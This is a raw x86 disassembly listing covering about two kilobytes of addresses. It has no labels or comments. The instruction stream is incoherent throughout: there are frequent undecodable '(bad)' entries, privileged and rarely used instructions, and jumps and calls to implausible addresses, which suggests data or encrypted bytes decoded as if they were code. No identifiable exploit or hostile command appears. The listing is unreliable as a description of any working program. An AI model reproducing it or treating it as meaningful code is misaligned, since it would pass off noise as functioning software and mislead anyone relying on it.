  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
